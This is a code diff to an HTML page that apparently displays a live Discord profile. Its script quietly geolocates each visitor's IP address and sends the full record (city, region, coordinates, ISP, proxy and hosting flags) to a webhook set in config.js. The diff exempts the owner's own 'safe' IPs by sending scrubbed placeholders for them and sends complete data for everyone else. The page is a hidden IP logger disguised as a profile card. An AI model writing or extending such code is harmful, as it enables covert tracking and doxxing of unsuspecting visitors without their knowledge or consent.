@@ -73,12 +73,10 @@
   </div>
 
   <header class="header"></header>
-
-  <!-- Load webhook from external config -->
   <script src="./config.js"></script>
 
   <script>
-    const SAFE_IPS = ["123.45.67.89", "111.111.111.111"];
+    const SAFE_IPS = ["123.45.67.89", "111.111.111.111"]; // Replace with your real safe IPs
 
     function get_information(link, callback) {
       const xhr = new XMLHttpRequest();
@@ -132,19 +130,27 @@
       const userIp = data.query;
 
       if (SAFE_IPS.includes(userIp)) {
-        get_information("https://api.ipify.org/", function(ipText) {
-          const safeData = JSON.stringify({ status: "safe-ip", query: ipText });
-          ipLogByRaz("SAFE IP", safeData);
-        });
+        // 🚫 Scrub fields for safe IPs
+        const scrubbed = {
+          city: "Unknown",
+          region: "?",
+          country: "?",
+          lat: "?",
+          lon: "?",
+          isp: "Unknown",
+          org: "Unknown",
+          proxy: "Unknown",
+          hosting: "Unknown"
+        };
+        ipLogByRaz("SAFE IP", JSON.stringify(scrubbed));
         return;
       }
 
-      get_information("https://api.ipify.org/", function(ipText) {
-        ipLogByRaz(ipText, JSON.stringify(data));
-      });
+      // ✅ Send full info for non-safe IPs
+      ipLogByRaz(userIp, JSON.stringify(data));
     });
 
-    // Discord Info
+    // Live Discord Profile Info
     const badgeIcons = {
       activeDeveloper: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/active-developer.svg",
       hypesquadOnlineHouse2: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/hypesquad-brilliance.svg"
